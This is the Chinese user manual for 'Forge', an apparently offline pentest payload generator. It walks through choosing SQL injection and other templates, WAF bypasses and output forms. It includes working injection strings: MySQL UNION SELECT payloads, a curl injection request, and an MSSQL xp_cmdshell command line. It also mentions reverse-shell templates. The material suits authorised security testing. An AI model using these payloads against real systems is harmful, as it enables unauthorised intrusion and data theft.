# Forge 使用说明

> 名字叫 **Forge**（锻造）。它做的事情就是锻造：你把积木选好，它按你选的顺序锻成一件成品。
> 早期叫「Payload 拼接器」，现在统一用 Forge。

## 0. 它是什么

一个**确定性 payload 拼接器**：你把积木选好，它按你选的顺序拼起来，输出你要的形态。

```
你选漏洞类型 → 选模板 → 填参数 → 叠绕过 → 选输出形态 → 复制走
```

### 它不做什么（先看这个，比看功能重要）

| | |
| --- | --- |
| **不联网** | 全程本地，没有遥测，没有在线 API，不接 AI |
| **不执行** | 不会去跑生成的命令，不给你"一键发送"按钮 |
| **不验证** | 不探测目标、不判断漏洞存不存在、不保证 WAF 能绕过、不保证权限够 |
| **不猜** | 你不填的参数它不会替你猜，也不会去"理解"你的目标 |

它只保证一件事：**产出的文本语法正确，并且符合你勾的那些选择**。能不能打通，你自己判断。

使用后果由使用者负责——**只在你有授权的目标上使用**。

## 1. 跑起来

### 怎么拿到

**把整个目录拷过去就行。** 没有安装步骤、没有构建步骤、没有配置文件。

不需要装进 `site-packages`——**规则数据是这个工具的产品**，你得能直接改
`data/` 里的 YAML。装成 pip 包反而找不到数据了。

前置条件只有两个：

| | |
| --- | --- |
| Python | 3.8+。装的时候**勾上 "Add Python to PATH"** |
| PyYAML | 唯一的依赖包，`python -m pip install pyyaml` |

### 启动

```bash
python -m pip install pyyaml
```

然后二选一，**双击即可**：

| 文件 | 界面 | 什么时候用 |
| --- | --- | --- |
| `forge.bat` | 终端界面（TUI） | **SSH / 跳板机 / 无显示器** |
| `forge-gui.vbs` | 图形界面（GUI） | 本机桌面上 |

Linux / macOS 用 `./forge.sh` 和 `./forge-gui.sh`。

启动脚本会先切到自己的目录，所以**从哪调用都行**。

> **为什么 Linux 下是 `forge.sh` 而不是 `forge`**
>
> 引擎是一个包，目录名就叫 `forge/`。文件 `forge`（无扩展名）和目录 `forge/`
> 在同一层里**没法共存**，所以 POSIX 启动器带上 `.sh` 后缀避开。
> Windows 没这个问题——`forge.bat` 和目录 `forge` 靠扩展名区分得开。

> **GUI 为什么双击 `.vbs` 而不是 `.bat`**
>
> `.bat` 由 `cmd.exe` 执行，而 `cmd.exe` 是控制台程序——Windows 一定会给它分配
> 一个黑色控制台窗口。脚本启动时要检查依赖（约 1 秒），所以双击 `.bat` 会看到
> 黑框在屏幕上停一下再消失。**`.bat` 没有办法隐藏自己的控制台。**
>
> `.vbs` 由 `wscript.exe` 执行，它是 GUI 子系统程序，不分配控制台；脚本拉起的
> 每个子进程也都用隐藏窗口启动。所以从双击到窗口出现，全程没有黑框。

### 起不来的时候

GUI 起不来时会弹一个**对话框**（`.vbs` 没有控制台可以打印，所以走了弹窗）：

| 现象 | 原因 |
| --- | --- |
| 弹窗 `pythonw.exe was not found on PATH` | Python 没装，或者装的时候没勾 "Add Python to PATH"。重装勾上即可 |
| 弹窗 `Missing dependency` | 跑 `python -m pip install pyyaml`。弹窗里会把 pythonw 的完整路径打出来 |
| 弹窗里说 tkinter 缺失 | 重装 Python 时勾上 tcl/tk 选项。**终端界面不受影响**，用 `forge.bat` |
| 双击 `.vbs` 完全没反应 | Windows Script Host 可能被组策略禁用了。命令行跑 `python gui.py` 看报错 |
| `Python not found`（TUI） | Python 没装，或者装的时候没勾 "Add Python to PATH" |

> **关于 PATH 过长**：Windows 上 PATH 超过约 2047 字符后，直接敲 `python` 会报
> 「不是内部或外部命令」，即使 `where python` 能找到它。跳板机上装了一堆工具时很常见。
> 两个启动脚本已经用 `where` 定位、再按**完整路径**调用，所以不受影响。

## 2. 界面速览

跑起来是这样：

```

==========================================================================
 1 漏洞类型 SQL 注入 sqli        2 组件 （不限）          3 内容类型 （不限）
 4 版本     （不限）             5 输出层 原始载荷 raw, curl 命令 curl
 6 提交方式 URL 参数 query       7 绕过 无
 8 目标前提 无
--------------------------------------------------------------------------
 可用 134 条 / 共 584 条
   1) sqli.mssql.detect.version          MSSQL 版本回显
   2) sqli.mssql.union.basic             MSSQL UNION 联合查询
   3) sqli.mssql.union.marker            MSSQL UNION 回显位标记
   …

 编号=改字段   t=选模板   s=填参数   g=生成   q=退出
> 
```

### 界面上的中文，和括号里那个英文

字段和参数都显示成**中文 + 原来的标识符**——「闭合符 close」「SQL 表达式 sql-expression」。

中文是给人看的，后面那个 id 才是**真正的取值**：文档、报错信息、`import forge`
写脚本时用的都是它。两者说的是同一件东西，不用记两套。

这套中文在 `data/labels.yaml` 里，是**可以改的数据**。没登记过的名字原样显示 id，
所以新加了槽位忘了登记也不会出错，只是少一层中文。

就五个动作：

| 输入 | 干什么 |
| --- | --- |
| `1`~`8` | 改对应的字段 |
| `t` | 从全部可用模板里挑一条（**可以直接输文字过滤**，见下） |
| `s` | 填当前模板的参数（槽位 / 变量） |
| `g` | 生成 |
| `q` | 退出 |
| 直接回车 | 什么都不做，重画一遍 |

**参数区**（选了模板才出现）显示这条模板要你填什么：

```
      参数 闭合符 close         = "'"
      参数 列数 cols            = '3'
      参数 注释符 comment       = '-- -'
      参数 回显位 pos           = '1'
```

显示的是**实际会用的值**——没填过的槽位显示它的默认值，不是空。

### 列表长了就直接输文字过滤

按 `t` 打开的「全部可用模板」默认就有 134 项、不限漏洞类型 584 项 —— 一次打印出来
是好几屏。而**你往往是照着文档来找某一条**，所以菜单里**直接输文字就行**：

```
选择 > union.basic
  匹配 5 / 134 条
   1) sqli.mssql.union.basic         MSSQL UNION 联合查询
   2) sqli.mysql.union.basic         MySQL UNION 联合查询
   3) sqli.oracle.union.basic        Oracle UNION 联合查询
   4) sqli.postgresql.union.basic    PostgreSQL UNION 联合查询
   5) sqli.sqlite.union.basic        SQLite UNION 联合查询
   0) 取消
选择 > 2
```

- 匹配的是 **id / 中文名 / 说明**三处，输 `union.basic`（id）、`JSP`（中文名）、
  `反弹`（只在说明里）都能找到
- **编号按过滤后的列表算** —— 上面输 `2` 选中的是 MySQL 那条
- 输 `*` 复原成全部；过滤不到任何东西时也会自动复原，不会把你晾在空菜单里
- 任何菜单都能这么用（组件、目标前提、绕过……选项多的那几个尤其省事）

## 3. 六个概念

| 概念 | 一句话 | 字段 |
| --- | --- | --- |
| **漏洞类型** | 你要打的是什么洞（SQL 注入 / 命令注入 / 模板注入 / XSS / 文件包含 / 开放重定向 / JWT / 原型链污染 …），共 20 类 | 1 |
| **组件** | 目标用的什么（mysql / flask / tomcat …），可留空 | 2 |
| **内容类型** | 载荷**文本本身**是什么语法写的 | 3 |
| **提交方式** | 载荷放在 HTTP 请求的**哪个位置** | 6 |
| **输出层** | 你最后**复制走的东西**长什么样 | 5 |
| **绕过** | 对拼好的串再做变换（编码 / 大小写 / 关键字拆分…） | 7 |
| **前提** | 目标必须具备什么条件 | 8 |

### 载荷没法预先枚举时：`<<phpser>>`

有一类载荷**只能按目标现拼**——PHP 的 POP 链长什么样，取决于目标代码里有哪些类、
属性是什么可见性。工具给不了现成答案，但能替你干最烦也最容易错的那部分：
**算字节长度**。

PHP 序列化里每一段都带长度前缀（`s:<字节数>:"内容";`），容器还要声明元素个数，
私有属性的名字里还嵌着 NUL。这些手写时数错一个字节，`unserialize()` 就直接报错，
而错误信息只说「offset N」，不告诉你哪儿错了。

所以 `deser.php.custom.structure` 这条模板分成两半：**结构你写，长度工具算**。

```
你在 spec 里填：  O:App\Cache{socket=O:SoapClient{uri=s:"http://x"}}
工具产出：        O:9:"App\Cache":1:{s:6:"socket";O:10:"SoapClient":1:{s:3:"uri";s:8:"http://x";}}
```

属性名前面加 `-` 是 protected、加 `#` 是 private，工具会连两个 NUL 一起算进长度。

POP 链里 `$obj->prop = $obj` 这种自引用也支持：给值打个 `&标签`，再用 `r:标签`
（同一个对象）或 `R:标签`（真引用）指回来。**引用编号也由工具算**——PHP 那份
「第几个值」的编号规则是从真 PHP 实测出来的，包括最容易漏的一条：
引用本身也占一个号，算错会让它后面所有值偏号。

完整的语法表见 [`模板写作规范.md`](模板写作规范.md)。

**产出的串会被工具自己校验一遍**：长度对不对、声明的属性个数和实际写出来的是不是
一个数——不对就标红并告诉你偏移在哪。

### 最容易混的两个：内容类型 vs 输出层

> **内容类型**描述"载荷文本的语法"，**输出层**描述"你拿到手的形态"。两者完全无关。

举个例子——MSSQL 的 `xp_cmdshell`：

```sql
'; EXEC xp_cmdshell 'net user'--
```

这段**文本是 T-SQL**（所以内容类型是 `sql-expression`），但它的**效果是执行系统命令**。
效果不是内容类型，那是 `desc` 和前提里写的事。

再比如：内容类型选「系统命令」，输出层选「curl」→ 你拿到一条 curl 命令；
输出层选「原始」→ 你拿到纯命令。**同一份载荷，输出形态由你选。**

### 前提是反着勾的

> **勾上 = 我的目标没有这个条件。** 勾上之后，需要它的模板会被筛掉。

这是这个工具最有用的地方，下一节单独讲。

## 4. 走一遍：MySQL 联合注入

假设你要打一个 MySQL 注入点，页面有回显。

**① 选漏洞类型**：默认就是 `sqli`，跳过。

**② 缩小范围**：按 `2` 选组件 `mysql`。可用模板从 134 条收窄到 36 条。

**③ 选模板**：按 `t`，挑 `sqli.mysql.union.basic`。

**④ 填参数**：按 `s`。这条模板有四个槽位：

```
槽位 闭合符 close      1) '   2) "   3) ')   4) ")   5) （空）
槽位 列数 cols         1) 1   2) 2   3) 3   …（默认 3）
槽位 回显位 pos        1) 1   2) 2   3) 3   …（默认 1）
槽位 注释符 comment    1) -- -   2) #   3) /**/
```

闭合符取决于注入点上下文，列数要先猜，注释符看目标方言。

**⑤ 选输出层**：按 `5`，填 `raw,curl`。

**⑥ 生成**：按 `g`：

```
组装链：
  槽位填充         ' UNION SELECT 1,2,3 -- -
  变量替换         ' UNION SELECT 1,2,3 -- -

--- raw ---
' UNION SELECT 1,2,3 -- -

--- curl ---
curl 'http://example.com/?id=%27%20UNION%20SELECT%201%2C2%2C3%20--%20-'

语法：该内容类型无可靠 parser（sql-expression）
```

把 curl 那行复制走即可。

### 联合注入的两步：先定列数，再定回显位

真实目标不会告诉你它的查询有几列、哪个位置会回显。这是两步：

**① 定列数** —— 用 `sqli.mysql.union.orderby` 递增序号，报错点就是列数。

**② 定回显位** —— 用 `sqli.mysql.union.basic`，把 `cols` 设成刚探出的列数：

```
槽位 cols = 3        →  ' UNION SELECT 1,2,3 -- -
```

页面上出现哪个数字，就是哪一位回显。

**③ 按回显位爆数据** —— 把回显位填进 `pos`，剩下的交给工具：

```
cols=3  pos=1  →  ' UNION SELECT @@version,2,3 -- -
cols=3  pos=2  →  ' UNION SELECT 1,@@version,3 -- -
cols=5  pos=4  →  ' UNION SELECT 1,2,3,@@version,5 -- -
```

**所有 UNION 类模板都认 `cols` 和 `pos`**——版本、读表名、读文件、自定义表达式，
包括 MSSQL / PostgreSQL / Oracle / SQLite。设一次，整族模板都跟着走。

> `pos` 超过 `cols` 时会提示「回显位超过列数」，载荷里留着占位符——
> **不静默给你一个坏串**。

要是回显位被 WAF 挡了，`sqli.mysql.union.marker` 可以把一个固定标记放在 `pos` 上，
先在页面里找到它，再换成真正要爆的表达式。

## 5. 前提筛选：这个工具最值钱的地方

真实的目标很少是"什么都能干"的。它可能没有回显、不支持堆叠查询、出不了网、不是高权限账号。
**需要这些条件的模板，选了也是白选。**

所以每个模板都标了它需要什么前提。勾上"目标没有"，工具就把需要它的筛掉：

```
 1 漏洞类型 SQL 注入 sqli        2 组件 mysql          3 内容类型 （不限）
 4 版本     （不限）             5 输出层 原始载荷 raw, curl 命令 curl
 6 提交方式 URL 参数 query       7 绕过 无
 8 目标前提 页面有回显位、目标可出网        ← 勾了这两条
--------------------------------------------------------------------------
 可用 24 条 / 共 584 条
   1) sqli.mysql.union.orderby           MySQL ORDER BY 猜列数
   2) sqli.mysql.error.extractvalue      MySQL extractvalue 报错注入
   3) sqli.mysql.error.updatexml         MySQL updatexml 报错注入
   4) sqli.mysql.bool.blind              MySQL 布尔盲注
   5) sqli.mysql.time.sleep              MySQL 时间盲注 SLEEP
   …
   （多出 243 条：去掉漏洞类型限定「sqli」）
```

MySQL 一共 36 条模板，勾两条前提就只剩 24 条——**少了的那 12 条正好是白选的**。

常用前提和它们的影响面（按卡住的模板数排序）：

| 前提 | 卡住多少条 | 意思 |
| --- | ---: | --- |
| 已在 lhost 上起监听 | 74 | 带外接收、反弹 shell |
| 目标可出网 | 68 | 带外、反弹、下载执行都靠它 |
| 目标加固不到位 | 61 | 未开 safeMode / xp_cmdshell 还开着 之类 |
| 目标过滤存在缺陷 | 58 | 有过滤但可绕 |
| 需要事先侦察出的目标信息 | 57 | 表名、类名、下标这类要先摸清楚 |
| 页面有回显位 | 57 | 注入结果直接出现在响应正文里 |

> 这张表按**全部 584 条模板**统计。只看 sqli 视图时数字会小得多
> （比如「页面有回显位」只卡住 50 条）——两者都对，口径不同。

### 筛到一个都不剩时，工具告诉你放宽哪一条

```
 当前条件下没有可用模板。放宽下列任一条：

   去掉漏洞类型限定「rce」                            多出 134 条
   去掉内容类型限定「sql-expression」                 多出 51 条
```

有结果时也会带一条提示，告诉你再放宽能多拿到什么。

GUI 里这些是**可点击的按钮**：勾上"显示缺前提的"，选中一条被筛掉的模板，
面板会显示"它需要什么"，旁边一个「放宽这 N 项并用它」。

### 一个反直觉的地方

**没有任何前提要求的模板是筛不掉的**。比如各种"登录绕过"，它不需要回显、不需要堆叠、
不需要出网——勾再多前提它也在。所以纯靠勾前提很难勾到空；
真勾空了，多半是**漏洞类型和内容类型组合选错了**（比如选了 RCE 但内容类型还留着 SQL 表达式）。

### 拿不准就别勾

不确定目标有没有回显？**别勾**。默认只按漏洞类型筛（比如 sqli 是 134 条），
愿意赌就选需要回显的。勾上是你**声明事实**，工具据此收窄——不是工具替你判断。

## 6. 读懂输出

### 组装链

生成时会打印载荷是怎么一步步拼出来的。这是排错的主要依据——比如你叠了编码，
可以直接看到每一步的结果：

```
组装链：
  槽位填充     ' UNION SELECT 1,2,3 -- -
  变量替换     ' UNION SELECT 1,2,3 -- -
  交替大小写   ' UnIoN SeLeCt 1,2,3 -- -
  URL 编码     %27%20UnIoN%20SeLeCt%201%2C2%2C3%20--%20-
```

叠了两层绕过，中间结果一目了然。绕过是**盲盒**还是**可见的**，差别就在这里。

而且某一步如果**什么都没做**，工具会直接说出来：

```
提示：绕过 注释替代空格 没有改变载荷 —— 可能被前一步抵消了（检查绕过顺序）
```

### 语法校验

| 状态 | 意思 |
| --- | --- |
| `xxx 语法校验通过` | 真校验了，也真通过了 |
| `语法校验未通过：…` | **照常输出**，只是标红。工具只报告，不拦你 |
| `该内容类型无可靠 parser（xxx）` | **没校验，不是失败**。SQL / PHP / Java / Shell 等本来就没有可靠 parser |

第三行最容易误读。工具只对 Python / JSON / XML / Jinja2 / PHP 序列化这几个有可靠 parser
的真做校验，其余如实说"没校验"——**不假装校验过**。

### 提示（都是提示，不拦截）

生成时可能带出一些提醒，它们**不影响输出**，只告诉你工具观察到的事实：

| 提示 | 什么时候出现 |
| --- | --- |
| **重复编码** | 绕过链里已有 URL 编码，提交方式又会再编一次。多数时候是误操作，本意是 WAF 绕过就忽略 |
| **绕过没有改变载荷** | 某一步绕过跑了但产出没变——多半是**被前一步抵消了**。比如「注释替代空格」排在 URL 编码之后，此时空格已经变成 `%20`，替换找不到目标 |
| **绕过与漏洞类型不匹配** | 把 SQL 的空格绕过套到 shell 命令上了。仍按你的选择应用 |
| **变量落在引号字面量内且含引号** | 会**提前闭合字面量、截断载荷**。需要按目标语法转义（SQL / PowerShell 写成两个引号） |
| **含黑名单关键字 / 超长** | 在输出层设了约束，成品没满足 |

## 7. 常见困惑

**Q：为什么这条模板灰掉了 / 不在列表里？**
它需要的前提被你勾成"没有"了。GUI 里勾上"显示缺前提的"，或者看放宽建议。

**Q：`<<lhost>>` 原样留在载荷里没被替换？**
你没填 `lhost`。**回调地址类变量故意没有默认值**——漏填应该得到一个明显不可用的串，
而不是一个指向某个真实地址的串。

**Q：版本填了但不匹配的模板还显示？**
有意为之。发行版的 backport 会让版本号严重失真，按版本号硬筛一定会漏掉你要的模板。
版本不符只做标记，不禁用。

**Q：绕过要按什么顺序？**
**你排的顺序就是应用顺序**，顺序会影响结果。比如「注释替代空格」+「URL 编码」：

| 顺序 | 产出 |
| --- | --- |
| 先空格后编码 | `%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT…` |
| 先编码后空格 | `%27%20UNION%20SELECT…` ← 空格替换没生效 |

第二种顺序里空格已经变成 `%20` 了，替换找不到目标，工具会提示"没有改变载荷"。

**但不是所有组合都受顺序影响**——「交替大小写」和「URL 编码」互换顺序产出完全相同
（字母编码后还是字母，大小写替换照样找得到目标）。

**Q：能不能一次生成一批？**
界面是一次一条。要批量就 `import forge` 直接调引擎，
`load_rules` / `make_state` / `generate` 都是纯函数。

**Q：能打真实目标吗？**
这不是扫描器，是生成器。它不碰目标。生成的载荷怎么用、打到哪，是你的判断。

## 8. 边界

- **载荷是文本串，表达不了二进制**。文件上传的魔术字节只收 `GIF89a` / `%PDF-1.4` / `RIFF`
  这类纯文本可表达的；PNG 的 `\x89PNG`、ZIP 的 `PK\x03\x04` 表达不了。
  反序列化里 pickle **协议 0 是纯 ASCII 可以做**，协议 2+ 不行。
  二进制载荷走外部生成器（ysoserial / phpggc），工具里只放外层包装。
- **模板库不附第三方 payload 数据**。规则是手写的，需要你自己扩充——见 `模板写作规范.md`。
- **导出过什么、发过什么，工具不记录**。它不保存历史。

## 9. 想加模板？

见 [`模板写作规范.md`](模板写作规范.md)。数据是这个项目的主体（行数是引擎代码的两倍），
加模板不是"填空"，是**提供一条你确认过可用的载荷**。

```bash
python new_template.py sqli.postgresql.union.dump --name "PostgreSQL UNION 读库名" \
  --ctype sql-expression
```
